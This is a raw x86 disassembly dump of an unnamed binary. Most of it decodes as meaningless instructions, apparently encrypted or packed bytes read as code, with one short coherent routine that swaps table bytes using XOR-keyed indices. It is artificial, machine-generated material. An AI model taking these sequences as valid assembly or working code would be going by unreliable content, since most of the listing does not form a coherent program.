  40c15c:	call   0x776d:0x5c118f66
  40c163:	fild   QWORD PTR [esi-0x5e73b611]
  40c169:	shl    esp,1
  40c16b:	dec    edi
  40c16c:	into   
  40c16d:	add    al,0xd2
  40c16f:	(bad)  
  40c170:	cmp    ch,BYTE PTR [edi+0x185bd717]
  40c176:	repz mov ah,0x89
  40c179:	xchg   edx,eax
  40c17a:	xlat   BYTE PTR ds:[ebx]
  40c17b:	mov    ah,0x11
  40c17d:	mov    ds:0x8dfcb700,al
  40c182:	std    
  40c183:	cmp    ch,BYTE PTR [eax+eax*8-0x739b20a5]
  40c18a:	xor    al,0x9d
  40c18c:	xchg   ebp,eax
  40c18d:	in     al,0x85
  40c18f:	add    eax,0x6aa60359
  40c194:	repnz adc ecx,ebp
  40c197:	pop    ebp
  40c198:	retf   
  40c199:	jae    0x40c18a
  40c19b:	je     0x40c1d4
  40c19d:	push   edi
  40c19e:	push   0x11188752
  40c1a3:	out    0xe1,eax
  40c1a5:	push   ss
  40c1a6:	pop    ebp
  40c1a7:	adc    ch,BYTE PTR ds:0x273a1fd7
  40c1ad:	daa    
  40c1ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1af:	inc    ebp
  40c1b0:	outs   dx,BYTE PTR ds:[esi]
  40c1b1:	pop    ebx
  40c1b2:	mov    ah,0x73
  40c1b4:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40c1b6:	dec    eax
  40c1b7:	bnd jbe 0x40c1d7
  40c1ba:	test   al,0x57
  40c1bc:	jmp    0x8b76:0xc7a2d61
  40c1c3:	mov    WORD PTR [edi-0x43],gs
  40c1c6:	dec    eax
  40c1c7:	add    edx,ecx
  40c1c9:	jmp    0x40cc8f
  40c1ce:	jmp    0x40c541
  40c1d3:	push   ss
  40c1d4:	daa    
  40c1d5:	inc    ecx
  40c1d6:	imul   esi,DWORD PTR [ecx+0x69],0xb3b66736
  40c1dd:	xchg   ecx,eax
  40c1de:	popf   
  40c1df:	cmp    DWORD PTR [edx],esp
  40c1e1:	mov    eax,ds:0x7c8839b5
  40c1e6:	jl     0x40c1b2
  40c1e8:	jns    0x40c266
  40c1ea:	jl     0x40c266
  40c1ec:	jae    0x40c23e
  40c1ee:	mov    esp,0x9640fd3d
  40c1f3:	fwait
  40c1f4:	pop    ecx
  40c1f5:	dec    edi
  40c1f6:	xchg   esi,eax
  40c1f7:	ficomp DWORD PTR [eax-0x55]
  40c1fa:	cwde   
  40c1fb:	clc    
  40c1fc:	cs dec edx
  40c1fe:	test   DWORD PTR [bp+di],0x4bcad8c5
  40c205:	xchg   ebx,eax
  40c206:	and    DWORD PTR [edx-0x6a6a8e18],0xd
  40c20d:	stos   DWORD PTR es:[edi],eax
  40c20e:	mov    bl,0x7a
  40c210:	or     al,0x4e
  40c212:	test   BYTE PTR [ebp+0x6],dh
  40c215:	push   ss
  40c216:	jle    0x40c283
  40c218:	sbb    eax,0x6bfb0ad9
  40c21d:	call   0xffc7ff03
  40c222:	mov    ebp,0xff2622c5
  40c227:	sub    ebx,DWORD PTR cs:[eax+0x7d]
  40c22b:	dec    edx
  40c22c:	mov    bl,0x3b
  40c22e:	push   edx
  40c22f:	xchg   ecx,eax
  40c230:	push   eax
  40c231:	cli    
  40c232:	or     eax,0x62c03b46
  40c237:	dec    edx
  40c238:	mov    ecx,0x4eb47090
  40c23d:	fistp  DWORD PTR [eax]
  40c23f:	sub    ch,BYTE PTR [ebx-0x753fa98b]
  40c245:	cmp    DWORD PTR [eax+0xf],ecx
  40c248:	mov    ecx,?
  40c24a:	fisub  DWORD PTR [ebx]
  40c24c:	vpmullw xmm6,xmm0,xmm0
  40c250:	sbb    ah,ah
  40c252:	gs loope 0x40c2b2
  40c255:	fcmovnu st,st(2)
  40c257:	push   esp
  40c258:	jae    0x40c1f9
  40c25a:	mov    ecx,DWORD PTR [ebx+0x71403808]
  40c260:	imul   edx,DWORD PTR [ecx],0x31dd9eb9
  40c266:	dec    ebp
  40c267:	mov    al,ds:0xad498ab5
  40c26c:	mov    ds:0xf3c1a9d4,al
  40c271:	(bad)  
  40c272:	jns    0x40c29e
  40c274:	aad    0x8d
  40c276:	daa    
  40c277:	or     eax,DWORD PTR [esi]
  40c279:	shr    dl,0x86
  40c27c:	add    BYTE PTR [edx],bl
  40c27e:	adc    al,BYTE PTR [esi-0x5b]
  40c281:	cmp    eax,0xfa2bb42b
  40c286:	push   ss
  40c287:	adc    eax,0x338558a3
  40c28c:	pop    edx
  40c28d:	sar    BYTE PTR [ebx+eax*1],cl
  40c290:	ds jnp 0x40c25e
  40c293:	je     0x40c2f6
  40c295:	adc    eax,0x26e0022d
  40c29a:	lea    eax,[edi+0x3e]
  40c29d:	and    al,0x84
  40c29f:	sti    
  40c2a0:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40c2a2:	mov    eax,DWORD PTR ds:0xac112f20
  40c2a8:	push   0x48
  40c2aa:	jp     0x40c2b6
  40c2ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2ad:	aad    0x6f
  40c2af:	xchg   esi,eax
  40c2b0:	loopne 0x40c25f
  40c2b2:	arpl   WORD PTR [edx-0x47cc052a],si
  40c2b8:	and    eax,0xb4d00d96
  40c2bd:	pop    ecx
  40c2be:	push   ds
  40c2bf:	cmp    BYTE PTR [edi-0x6d990d6f],ch
  40c2c5:	jl     0x40c295
  40c2c7:	mov    ebx,edi
  40c2c9:	ins    BYTE PTR es:[edi],dx
  40c2ca:	daa    
  40c2cb:	stc    
  40c2cc:	add    DWORD PTR [edx],esi
  40c2ce:	call   0x8192:0x81a3bc8b
  40c2d5:	xor    eax,0x344c32ba
  40c2da:	push   edx
  40c2db:	dec    eax
  40c2dc:	sbb    ebp,DWORD PTR [ebx+0x6db89265]
  40c2e2:	add    ebx,DWORD PTR [esi]
  40c2e4:	xchg   edi,eax
  40c2e5:	sahf   
  40c2e6:	add    edx,esp
  40c2e8:	adc    cl,BYTE PTR [ecx-0x75]
  40c2eb:	push   eax
  40c2ec:	jae    0x40c299
  40c2ee:	jmp    0x5d9c:0xad78535
  40c2f5:	sbb    ebx,DWORD PTR [edx-0x4b7bc625]
  40c2fb:	push   0xd0112b5f
  40c300:	inc    esp
  40c301:	pop    ss
  40c302:	imul   eax,ecx,0x18
  40c305:	rol    BYTE PTR [ecx+ecx*1],0x8b
  40c309:	lock fmul QWORD PTR [esi]
  40c30c:	mov    ah,0xf4
  40c30e:	clc    
  40c30f:	dec    ecx
  40c310:	dec    edi
  40c311:	call   0x48564144
  40c316:	dec    edi
  40c317:	mov    BYTE PTR [eax],ah
  40c319:	mov    ebp,0x31bcf0f0
  40c31e:	mov    bh,0x5e
  40c320:	daa    
  40c321:	lods   al,BYTE PTR ds:[esi]
  40c322:	jns    0x40c2c9
  40c324:	mov    ah,0xa1
  40c326:	fucom  st(6)
  40c328:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c329:	cmp    DWORD PTR [ebx],esi
  40c32b:	retf   
  40c32c:	fsub   st,st(5)
  40c32e:	mov    ds:0xf5ecb46a,al
  40c333:	mov    ecx,0x7c446de7
  40c338:	out    0xfd,al
  40c33a:	(bad)  
  40c33b:	lods   al,BYTE PTR ds:[esi]
  40c33c:	(bad)  
  40c33e:	adc    dh,BYTE PTR [esi]
  40c340:	xchg   edx,eax
  40c341:	inc    esi
  40c342:	mov    ds:0x65f7c0d9,eax
  40c347:	popf   
  40c348:	out    0x44,eax
  40c34a:	aad    0xc0
  40c34c:	cmp    DWORD PTR [edx],ebx
  40c34e:	fnstcw WORD PTR [ebx-0x4de6997f]
  40c354:	or     al,0x35
  40c356:	lods   al,BYTE PTR ds:[esi]
  40c357:	fnsave [ebp+eiz*4-0x517cf7ce]
  40c35e:	sub    al,0x29
  40c360:	pop    esp
  40c361:	push   ebx
  40c362:	mov    ds,WORD PTR [eax-0x296fbcd6]
  40c368:	sub    DWORD PTR ds:0x76ed218d,edi
  40c36e:	ja     0x40c34b
  40c370:	stos   BYTE PTR es:[edi],al
  40c371:	xor    DWORD PTR [edx],edx
  40c373:	gs pop esi
  40c375:	add    ah,BYTE PTR [ebp+0x180c92eb]
  40c37b:	add    cl,dh
  40c37d:	sbb    esp,DWORD PTR [ebx]
  40c37f:	mov    WORD PTR [esi+edx*2],cs
  40c382:	jb     0x40c3d8
  40c384:	icebp  
  40c385:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c386:	fild   DWORD PTR [ebp+0x10]
  40c389:	jo     0x40c3a3
  40c38b:	in     eax,0x72
  40c38d:	cmp    dh,BYTE PTR [ecx+0x218289e3]
  40c393:	xchg   edx,eax
  40c394:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c395:	data16 adc BYTE PTR [eax+0x7f],cl
  40c399:	(bad)  
  40c39a:	repz sub al,0x73
  40c39d:	fld    QWORD PTR [esi*4+0x4b914da5]
  40c3a4:	mov    esi,edi
  40c3a6:	push   ss
  40c3a7:	je     0x40c422
  40c3a9:	push   ecx
  40c3aa:	push   ecx
  40c3ab:	sbb    eax,0x68d104a6
  40c3b0:	mov    al,ds:0x4cad5519
  40c3b5:	(bad)  
  40c3b7:	cmp    DWORD PTR [ecx+esi*4-0x156d70e1],edx
  40c3be:	mov    eax,0xfa23ec3b
  40c3c3:	push   ds
  40c3c4:	inc    ebp
  40c3c5:	push   ss
  40c3c6:	aad    0x8d
  40c3c8:	ret    
  40c3c9:	imul   edi,DWORD PTR [ebp+0x3f9ac2a2],0x99fe6387
  40c3d3:	mov    ch,BYTE PTR [ebx-0x7d550743]
  40c3d9:	jns    0x40c378
  40c3db:	mov    si,0x4397
  40c3df:	push   eax
  40c3e0:	dec    edx
  40c3e1:	hlt    
  40c3e2:	jecxz  0x40c416
  40c3e4:	nop
  40c3e5:	or     BYTE PTR ds:0xf1e953ec,dl
  40c3eb:	ja     0x40c467
  40c3ed:	sbb    al,0x6b
  40c3ef:	push   es
  40c3f0:	sub    bh,BYTE PTR [ebp+0x55]
  40c3f3:	lock lea edx,[esi]
  40c3f6:	or     eax,0x8e5a0276
  40c3fb:	cmp    ah,dl
  40c3fd:	inc    esi
  40c3fe:	dec    edi
  40c3ff:	not    DWORD PTR [ecx-0x37]
  40c402:	xor    BYTE PTR [edx],0xf3
  40c405:	jle    0x40c42a
  40c407:	dec    edi
  40c408:	stos   DWORD PTR es:[edi],eax
  40c409:	or     eax,DWORD PTR [ebp-0x71]
  40c40c:	mov    DWORD PTR [ebp+0x18cba7be],eax
  40c412:	or     esi,DWORD PTR [ebx-0x37]
  40c415:	jae    0x40c441
  40c417:	lahf   
  40c418:	pushf  
  40c419:	scas   eax,DWORD PTR es:[edi]
  40c41a:	int    0xeb
  40c41c:	sub    bh,BYTE PTR [ebx]
  40c41e:	ds mov bl,0xd4
  40c421:	add    bl,ch
  40c423:	pushf  
  40c424:	mov    esp,0x56997111
  40c429:	mov    edx,0xe28ad8d4
  40c42e:	lds    esp,FWORD PTR [ecx]
  40c430:	inc    ebp
  40c431:	xor    cl,BYTE PTR gs:0x7770dc16
  40c438:	fld    DWORD PTR [ebx]
  40c43a:	and    bh,dl
  40c43c:	sbb    ch,BYTE PTR [ebx-0x41]
  40c43f:	push   ds
  40c440:	retf   0xe468
  40c443:	jbe    0x40c46e
  40c445:	(bad)  
  40c447:	push   ebp
  40c448:	inc    edx
  40c449:	mov    cl,0x8
  40c44b:	jo     0x40c466
  40c44d:	dec    eax
  40c44e:	dec    edx
  40c44f:	daa    
  40c450:	(bad)  
  40c451:	stos   DWORD PTR es:[edi],eax
  40c452:	aas    
  40c453:	outs   dx,DWORD PTR ds:[esi]
  40c454:	xchg   edx,eax
  40c455:	push   esp
  40c456:	test   eax,0xce2eedb5
  40c45b:	mov    al,ds:0xaa5c314c
  40c460:	scas   al,BYTE PTR es:[edi]
  40c461:	out    0x12,eax
  40c463:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c464:	sub    esp,DWORD PTR [ebx+eiz*4+0x5c]
  40c468:	mov    ds:0x4b04ce05,eax
  40c46d:	dec    ebp
  40c46e:	dec    ebx
  40c46f:	inc    esp
  40c470:	mov    esi,0x6858d90d
  40c475:	int    0x7
  40c477:	inc    edx
  40c478:	mov    al,0x25
  40c47a:	inc    esi
  40c47b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c47c:	xchg   ecx,eax
  40c47d:	ret    0x5cfe
  40c480:	and    DWORD PTR [edi+eax*4],edi
  40c483:	sbb    al,0xda
  40c485:	sub    DWORD PTR [esi+ebp*4-0x14],edi
  40c489:	sbb    ch,ah
  40c48b:	data16 in al,dx
  40c48d:	jmp    0xb3c77c51
  40c492:	mov    esp,edx
  40c494:	pop    ebx
  40c495:	pop    eax
  40c496:	adc    al,0x7c
  40c498:	pop    ds
  40c499:	inc    eax
  40c49a:	or     edx,DWORD PTR [ebx-0x16ddcfc5]
  40c4a0:	pop    esi
  40c4a1:	cmp    BYTE PTR [ebp+ebp*8-0x56688ff6],0xba
  40c4a9:	xor    eax,0xbf7396e2
  40c4ae:	or     cl,ah
  40c4b0:	pop    eax
  40c4b1:	cmp    BYTE PTR [edx+0x12d70f1f],cl
  40c4b7:	or     DWORD PTR [eax-0x4477aee1],0x1d51044b
  40c4c1:	push   eax
  40c4c2:	popa   
  40c4c3:	je     0x40c49d
  40c4c5:	lock fwait
  40c4c7:	cld    
  40c4c8:	mov    BYTE PTR [ebx+eax*8-0x25881325],bh
  40c4cf:	mov    ch,0x91
  40c4d1:	mov    ds:0x4706ec90,eax
  40c4d6:	cmp    edi,DWORD PTR [ebp-0x41]
  40c4d9:	repnz icebp 
  40c4db:	dec    ebx
  40c4dc:	inc    edi
  40c4dd:	jbe    0x40c4e9
  40c4df:	outs   dx,BYTE PTR ds:[esi]
  40c4e0:	ins    BYTE PTR es:[edi],dx
  40c4e1:	sar    ebp,0xac
  40c4e4:	push   edx
  40c4e5:	mov    eax,0xf14bccd9
  40c4ea:	mov    ecx,0x57fb5bc4
  40c4ef:	xchg   esp,eax
  40c4f0:	add    al,0x5d
  40c4f2:	scas   al,BYTE PTR es:[edi]
  40c4f3:	add    ecx,DWORD PTR [ebp-0x56]
  40c4f6:	jp     0x40c495
  40c4f8:	out    0xa4,eax
  40c4fa:	ja     0x40c4a9
  40c4fc:	xlat   BYTE PTR ds:[ebx]
  40c4fd:	nop
  40c4fe:	xchg   edi,eax
  40c4ff:	jbe    0x40c4bb
  40c501:	push   0x58f18c45
  40c506:	aaa    
  40c507:	rcr    BYTE PTR [ecx-0x63],1
  40c50a:	inc    ebp
  40c50b:	int    0xc6
  40c50d:	dec    BYTE PTR [edi]
  40c50f:	xor    BYTE PTR cs:[esi+0x658a1156],dh
  40c516:	ret    0x3593
  40c519:	pop    es
  40c51a:	and    al,0x23
  40c51c:	out    dx,al
  40c51d:	adc    eax,DWORD PTR ss:[edi+0x42d82bf7]
  40c524:	call   FWORD PTR [ecx-0x4b25809c]
  40c52a:	ds ffree st(7)
  40c52d:	mov    esp,0xda8902a1
  40c532:	int    0xc
  40c534:	add    al,0xab
  40c536:	cmp    al,0xff
  40c538:	pop    edi
  40c539:	test   BYTE PTR [esi],al
  40c53b:	int3   
  40c53c:	lahf   
  40c53d:	pushf  
  40c53e:	into   
  40c53f:	cld    
  40c540:	jecxz  0x40c4cd
  40c542:	push   ebp
  40c543:	call   0x5544957b
  40c548:	in     al,dx
  40c549:	mov    edi,DWORD PTR [ebp-0x1c]
  40c54c:	jmp    0x40c8bf
  40c551:	push   esp
  40c552:	pushf  
  40c553:	scas   al,BYTE PTR es:[edi]
  40c554:	stos   DWORD PTR es:[edi],eax
  40c555:	jbe    0x40c50c
  40c557:	pop    ebp
  40c558:	arpl   WORD PTR ds:0x2469733d,si
  40c55e:	addr16 push 0x31
  40c561:	xchg   edi,eax
  40c562:	xchg   ebp,eax
  40c563:	jl     0x40c5e1
  40c565:	retf   0x7c79
  40c568:	jl     0x40c59c
  40c56a:	inc    BYTE PTR [ebx+0x7ceb0f60]
  40c570:	and    eax,0xb8fe1f4e
  40c575:	rcl    DWORD PTR [esi],cl
  40c577:	inc    eax
  40c578:	add    eax,eax
  40c57a:	jmp    0x5a73dde0
  40c57f:	loope  0x40c5a9
  40c581:	call   0x71af:0xaf7669dc
  40c588:	sti    
  40c589:	mov    WORD PTR [edx+0x3547394f],ss
  40c58f:	fisubr DWORD PTR [ebx+0x76070296]
  40c595:	or     BYTE PTR [eax+ebp*1],0xda
  40c599:	xor    al,0xf2
  40c59b:	lea    ebp,[edx]
  40c59d:	dec    ebx
  40c59e:	cmp    BYTE PTR [edi+0x360739a5],0xb9
  40c5a5:	das    
  40c5a6:	xchg   ebp,eax
  40c5a7:	enter  0xbae3,0xcb
  40c5ab:	shl    BYTE PTR [esi],1
  40c5ad:	jmp    0xe567:0xbfc01f75
  40c5b4:	mov    edx,0x9af08838
  40c5b9:	pop    edi
  40c5ba:	xchg   DWORD PTR [edx+0x4a33495b],esi
  40c5c0:	mov    ah,0xab
  40c5c2:	mov    ecx,0x786db67
  40c5c7:	int    0x6d
  40c5c9:	adc    al,0xbf
  40c5cb:	setns  BYTE PTR [eax-0x41]
  40c5cf:	sbb    edx,DWORD PTR [ebp-0x54]
  40c5d2:	xor    edx,DWORD PTR [ebx-0x7c801b8]
  40c5d8:	cmp    BYTE PTR [ecx-0x5],bh
  40c5db:	inc    eax
  40c5dc:	inc    eax
  40c5dd:	pop    esi
  40c5de:	cmp    al,0xeb
  40c5e0:	fnstcw WORD PTR [edx-0x25]
  40c5e3:	and    eax,0x41069ac1
  40c5e8:	outs   dx,DWORD PTR ds:[esi]
  40c5e9:	jne    0x40c643
  40c5eb:	arpl   ax,cx
  40c5ed:	fst    DWORD PTR [ecx-0x55]
  40c5f0:	sbb    esi,DWORD PTR [esi]
  40c5f2:	mov    ah,BYTE PTR [ebx-0x50c0128a]
  40c5f8:	pop    esi
  40c5f9:	fucomip st,st(7)
  40c5fb:	xor    BYTE PTR [edx],0xa0
  40c5fe:	test   al,0xd9
  40c600:	mov    ds:0x38b2563d,eax
  40c605:	retf   
  40c606:	xor    eax,0x78c7f5e
  40c60b:	ret    0x80b3
  40c60e:	cmp    esi,DWORD PTR [ebx+0x51]
  40c611:	imul   ebp,DWORD PTR [esi+ebp*8-0x74fcb16f],0xffffffa4
  40c619:	test   al,0x1e
  40c61b:	call   0xad4e0da5
  40c620:	jmp    0x7faafbe7
  40c625:	ds int 0x5e
  40c628:	xor    BYTE PTR [eax-0x51600121],bh
  40c62e:	xor    eax,0x56dbf1e3
  40c633:	jle    0x40c5b9
  40c635:	fld    QWORD PTR ds:0x7f6af5a4
  40c63b:	imul   eax,DWORD PTR [edi],0x43
  40c63e:	add    BYTE PTR [eax-0x434797c6],0x32
  40c645:	push   ss
  40c646:	inc    esi
  40c647:	inc    eax
  40c648:	mov    ch,0x31
  40c64a:	les    esi,FWORD PTR [edx+0x1eac1301]
  40c650:	scas   eax,DWORD PTR es:[edi]
  40c651:	sbb    eax,0xbdcc8809
  40c656:	out    0x24,eax
  40c658:	add    DWORD PTR [eax],ecx
  40c65a:	or     eax,0x61dd40c8
  40c65f:	sub    ecx,DWORD PTR ds:0x4980afae
  40c665:	data16 or al,0xc8
  40c668:	fnstsw WORD PTR [edi*8+0x68af86a1]
  40c66f:	mov    ebp,0xa07e82b3
  40c674:	ss (bad) 
  40c676:	pop    esi
  40c677:	pop    eax
  40c678:	sbb    edi,esp
  40c67a:	mul    cl
  40c67c:	dec    edx
  40c67d:	mov    cl,0x32
  40c67f:	mov    ebp,0xb3fbd7fd
  40c684:	jnp    0x40c6f6
  40c686:	cmp    eax,0x2e8f2c6d
  40c68b:	and    dl,ch
  40c68d:	or     DWORD PTR [eax-0x58e1a0b7],0xd6c65ae9
  40c697:	rcl    BYTE PTR [edx-0x463de564],0xc7
  40c69e:	jbe    0x40c6fa
  40c6a0:	mov    eax,0x9593dce7
  40c6a5:	push   0x48c42a20
  40c6aa:	repz dec ecx
  40c6ac:	jge    0x40c67f
  40c6ae:	rcl    DWORD PTR [esi-0x62],0x3b
  40c6b2:	sbb    al,0xa3
  40c6b4:	xchg   esi,eax
  40c6b5:	imul   esp,esi,0xe35f3eab
  40c6bb:	inc    edi
  40c6bc:	ja     0x40c6f2
  40c6be:	shr    edi,0xc5
  40c6c1:	inc    ebx
  40c6c2:	repnz dec esp
  40c6c4:	push   0x2c3ba9d2
  40c6c9:	and    BYTE PTR [ebp-0x1f],bl
  40c6cc:	stos   DWORD PTR es:[edi],eax
  40c6cd:	outs   dx,DWORD PTR ds:[esi]
  40c6ce:	jo     0x40c721
  40c6d0:	rcr    DWORD PTR [ecx+0x7e5e6f37],1
  40c6d6:	xchg   esp,eax
  40c6d7:	sbb    al,0x33
  40c6d9:	xlat   BYTE PTR ds:[ebx]
  40c6da:	dec    ecx
  40c6db:	jecxz  0x40c6c0
  40c6dd:	xchg   sp,ax
  40c6df:	mov    ebx,0x8ef59541
  40c6e4:	jp     0x40c6fb
  40c6e6:	pop    ss
  40c6e7:	psadbw mm6,mm0
  40c6ea:	add    eax,0xfc0f7b35
  40c6ef:	out    dx,al
  40c6f0:	push   0x11
  40c6f2:	add    dl,BYTE PTR [edi+edx*2+0x4]
  40c6f6:	push   esi
  40c6f7:	repnz add ebp,DWORD PTR [eax+0x226ff802]
  40c6fe:	push   ss
  40c6ff:	cs push ds
  40c701:	push   esp
  40c702:	and    ecx,DWORD PTR [edx+0x3e]
  40c705:	outs   dx,BYTE PTR ds:[esi]
  40c706:	sub    BYTE PTR [ecx+0x488923d7],ah
  40c70c:	scas   eax,DWORD PTR es:[edi]
  40c70d:	clc    
  40c70e:	dec    esi
  40c70f:	stos   DWORD PTR es:[edi],eax
  40c710:	les    esp,FWORD PTR [eax-0x1cdcfc64]
  40c716:	jmp    0xe59:0x8a9a449a
  40c71d:	or     ch,ah
  40c71f:	lea    ecx,[ebx-0x2]
  40c722:	loop   0x40c70e
  40c724:	inc    ecx
  40c725:	jnp    0x40c75d
  40c727:	or     al,0x4d
  40c729:	in     eax,0x1f
  40c72b:	out    dx,al
  40c72c:	sbb    DWORD PTR [eax+0x31],edx
  40c72f:	jmp    0x82a9c320
  40c734:	mov    eax,ds:0xf7d05bd1
  40c739:	unpcklps xmm3,XMMWORD PTR [edx+0x39]
  40c73d:	iret   
  40c73e:	test   al,0xc2
  40c740:	pop    esi
  40c741:	ja     0x40c6c7
  40c743:	(bad)  
  40c744:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c745:	mov    cl,BYTE PTR [ebx+ebx*1+0x6c94178d]
  40c74c:	and    al,0xfa
  40c74e:	popa   
  40c74f:	(bad)  
  40c751:	daa    
  40c752:	test   DWORD PTR [ecx],edi
  40c754:	in     eax,0xea
  40c756:	dec    ebx
  40c757:	adc    eax,0xf170b30b
  40c75c:	call   0x875b534b
  40c761:	mov    bl,0x2c
  40c763:	mov    edi,0xcb204ab2
  40c768:	sbb    DWORD PTR [edx+0x57],ebx
  40c76b:	push   ss
  40c76c:	jle    0x40c747
  40c76e:	inc    edx
  40c76f:	(bad)  
  40c770:	fisttp WORD PTR [edx-0x6f912b6e]
  40c776:	repz and BYTE PTR [ebx+0x5a],cl
  40c77a:	sub    ch,BYTE PTR [edx+0x78]
  40c77d:	mov    ch,BYTE PTR [eax+0x67a2ef60]
  40c783:	sub    eax,0xdb763ecd
  40c788:	sar    ebp,cl
  40c78a:	jb     0x40c7c2
  40c78c:	cwde   
  40c78d:	sub    eax,DWORD PTR [edx-0x3bc708b2]
  40c793:	cmp    al,0x28
  40c795:	push   ds
  40c796:	popf   
  40c797:	int3   
  40c798:	jmp    0xdc1adacd
  40c79d:	jae    0x40c7a2
  40c79f:	inc    ecx
  40c7a0:	fstp   QWORD PTR [edx+0x71]
  40c7a3:	mov    edi,esp
  40c7a5:	push   ds
  40c7a6:	rol    BYTE PTR [edi-0xea930e6],1
  40c7ac:	ror    edx,cl
  40c7ae:	cli    
  40c7af:	inc    ebx
  40c7b0:	outs   dx,DWORD PTR ds:[esi]
  40c7b2:	push   ss
  40c7b3:	stc    
  40c7b4:	popf   
  40c7b5:	add    edi,edi
  40c7b7:	dec    esp
  40c7b8:	xchg   esi,eax
  40c7b9:	call   0xea25:0x6104085d
  40c7c0:	retf   0x39e4
  40c7c3:	add    BYTE PTR [edx+0x6ffd3553],0xe6
  40c7ca:	imul   eax,DWORD PTR [ecx],0x58
  40c7cd:	adc    BYTE PTR [esp+eiz*8-0x73da6f06],bh
  40c7d4:	or     BYTE PTR [ebx-0xe],dl
  40c7d7:	jle    0x40c7c7
  40c7d9:	sub    eax,0xeeaeba06
  40c7de:	add    bl,BYTE PTR [ebp-0x79e10826]
  40c7e4:	rsqrtps xmm3,xmm1
  40c7e7:	xchg   ecx,eax
  40c7e8:	push   0xf5938e8f
  40c7ed:	xchg   ebp,eax
  40c7ef:	sub    ebp,DWORD PTR [edi-0x1d60b119]
  40c7f5:	cld    
  40c7f6:	loopne 0x40c84b
  40c7f8:	inc    eax
  40c7f9:	xchg   DWORD PTR ss:[esi-0x701e34a7],eax
  40c800:	add    bl,bl
  40c802:	(bad)  
  40c803:	imul   edi,DWORD PTR [esi+0x15],0x6ddbbcf7
  40c80a:	stos   BYTE PTR es:[edi],al
  40c80b:	test   eax,0xc66a25e1
  40c810:	jle    0x40c7d5
  40c812:	inc    esi
  40c813:	(bad)  
  40c815:	mov    esi,0xb042a623
  40c81a:	repnz aam 0x97
  40c81d:	test   eax,0x84278b86
  40c822:	push   edi
  40c823:	lea    esi,[ebx+0x7ce6f412]
  40c829:	leave  
  40c82a:	retf   
  40c82b:	pop    eax
  40c82c:	pushf  
  40c82d:	and    al,0xc2
  40c82f:	mov    ah,0xbb
  40c831:	rol    BYTE PTR [edi],cl
  40c833:	push   esi
  40c834:	scas   al,BYTE PTR es:[edi]
  40c835:	mov    esi,0xfe235556
  40c83a:	dec    ebx
  40c83b:	es mov bl,0x5d
  40c83e:	sub    eax,DWORD PTR [edx-0x3d]
  40c841:	xchg   ecx,eax
  40c842:	push   cs
  40c843:	jmp    0xa3197c04
  40c848:	add    DWORD PTR [eax+0x15860e98],0x9a2b9eb7
  40c852:	imul   eax,DWORD PTR [esi+0x66b970e1],0x6a2cea8
  40c85c:	cdq    
  40c85d:	or     eax,0xd463a4d0
  40c862:	mov    eax,0x4742b04e
  40c867:	fwait
  40c868:	dec    ebp
  40c869:	or     eax,eax
  40c86b:	pop    es
  40c86c:	fimul  DWORD PTR [ebp+0x5c]
  40c86f:	ins    DWORD PTR es:[edi],dx
  40c870:	dec    esi
  40c871:	mov    eax,ds:0x469af13d
  40c876:	pop    es
  40c877:	fcomp  QWORD PTR [edi]
  40c879:	cmp    al,0xaa
  40c87b:	inc    ebp
  40c87c:	xchg   edx,eax
  40c87d:	jg     0x40c83e
  40c87f:	push   ecx
  40c880:	and    bl,BYTE PTR [eax-0x13]
  40c883:	add    eax,DWORD PTR [edx-0x2e2f226b]
  40c889:	test   BYTE PTR [ecx],bh
  40c88b:	xchg   ebp,eax
  40c88c:	faddp  st(4),st
  40c88e:	aad    0xb0
  40c890:	jo     0x40c8ce
  40c892:	xor    al,0xfe
  40c894:	call   0xb70:0x94269b07
  40c89b:	add    ebp,ebx
  40c89d:	dec    ebp
  40c89e:	pop    ebp
  40c89f:	imul   edi,DWORD PTR [edx-0x26],0xffffff80
  40c8a3:	lea    edi,[eax]
  40c8a5:	pop    esp
  40c8a6:	lock mov esi,0x377e4aa6
  40c8ac:	jmp    FWORD PTR [ebp-0x31]
  40c8af:	adc    ch,BYTE PTR [ebx+ebp*8]
  40c8b2:	jnp    0x40c851
  40c8b4:	xchg   bl,ah
  40c8b6:	mov    bh,0xa9
  40c8b8:	xchg   edi,eax
  40c8b9:	pop    esi
  40c8ba:	dec    edi
  40c8bb:	inc    edx
  40c8bc:	lock pushw ss
  40c8bf:	mov    dl,BYTE PTR [edx+edi*1+0x32729a]
  40c8c6:	mov    BYTE PTR [ebp+0xf],dl
  40c8c9:	mov    edx,DWORD PTR [ebp-0xc]
  40c8cc:	xor    edx,eax
  40c8ce:	add    edx,DWORD PTR [ebp-0x14]
  40c8d1:	mov    edi,DWORD PTR [ebp-0x1c]
  40c8d4:	mov    dl,BYTE PTR [edx+edi*1+0x32729a]
  40c8db:	mov    BYTE PTR [ebp+0xb],dl
  40c8de:	mov    dl,BYTE PTR [ebp+0xf]
  40c8e1:	mov    edi,DWORD PTR [ebp-0xc]
  40c8e4:	xor    edi,eax
  40c8e6:	add    edi,DWORD PTR [ebp-0x14]
  40c8e9:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c8ec:	mov    BYTE PTR [edi+ebx*1+0x32729a],dl
  40c8f3:	mov    dl,BYTE PTR [ebp+0xb]
  40c8f6:	mov    edi,DWORD PTR [ebp-0x18]
  40c8f9:	xor    edi,eax
  40c8fb:	add    edi,DWORD PTR [ebp-0x14]
  40c8fe:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c901:	mov    BYTE PTR [edi+ebx*1+0x32729a],dl
  40c908:	mov    edx,DWORD PTR [ebp-0x44]
  40c90b:	mov    edi,DWORD PTR [ebp-0xc]
  40c90e:	xor    edx,eax
  40c910:	xor    edi,eax
  40c912:	jmp    0x40cc85
  40c917:	dec    si
  40c919:	(bad)  
  40c91a:	mov    dh,0xf7
  40c91c:	mov    cl,0x71
  40c91e:	dec    esi
  40c91f:	imul   esp,DWORD PTR [eax+0x63],0xffffff8e
  40c923:	pusha  
  40c924:	pop    edx
  40c925:	add    ebx,DWORD PTR [ebp+0x6d]
